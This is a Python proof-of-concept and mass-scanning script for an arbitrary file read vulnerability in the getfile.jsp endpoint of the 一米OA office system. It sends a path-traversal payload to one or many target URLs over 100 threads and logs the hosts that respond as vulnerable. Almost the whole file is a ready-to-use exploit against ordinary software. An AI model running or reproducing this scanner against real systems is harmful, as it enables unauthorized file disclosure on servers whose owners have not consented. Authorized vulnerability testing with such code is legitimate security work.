import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings() # 校验证书错的时候防止报错

def banner():
	test="""███████╗████████╗███████╗██╗    ██╗ █████╗ ██████╗ ██████╗ 
██╔════╝╚══██╔══╝██╔════╝██║    ██║██╔══██╗██╔══██╗██╔══██╗
███████╗   ██║   █████╗  ██║ █╗ ██║███████║██████╔╝██║  ██║
╚════██║   ██║   ██╔══╝  ██║███╗██║██╔══██║██╔══██╗██║  ██║
███████║   ██║   ███████╗╚███╔███╔╝██║  ██║██║  ██║██████╔╝
╚══════╝   ╚═╝   ╚══════╝ ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ 

	"""
	print(test)

def main():
	banner()
	parser = argparse.ArgumentParser(description="一米OA getfile.jsp 任意文件读取漏洞")
	parser.add_argument("-u","--url",dest="url",type=str,help="input your url")
	parser.add_argument("-f","--file",dest="file",type=str,help="input your file path")

	args = parser.parse_args()

	if args.url and not args.file:
		poc(args.url)
	elif args.file and not args.url:
		line = []
		# print(111)
		with open(args.file,"r",encoding="utf-8") as fp:
			for i in fp.readlines():
				line.append(i.strip().replace("\n",""))
		mp=Pool(100)
		mp.map(poc,line)
		mp.close()
		mp.join()
	else:
		print(f"uage\n\t {sys.argv[0]}-h")


def poc(target):
	headers={
		'User-Agent':'Mozilla/5.0'
	}
	proxies={
		'http':"http://127.0.0.1:7890",
		'https':"http://127.0.0.1:7890"
	}
	payload="/public/getfile.jsp?user=1&prop=activex&filename=../public/getfile&extname=jsp "

	try:
		response = requests.get(url=target+payload,headers=headers,verify=False)
		if response.status_code == 200:
			print(f"[+]该站点{target}存在任意文件读取漏洞")
			with open("result.txt","a") as fp:
				fp.write(f"{target}"+"\n")
		else:
			print(f"[-]该站点{target}不存在任意文件读取漏洞")
	except Exception as e:
		print(f"[*]该站点{target}存在访问问题，请手工测试")

if __name__ == '__main__':
	main()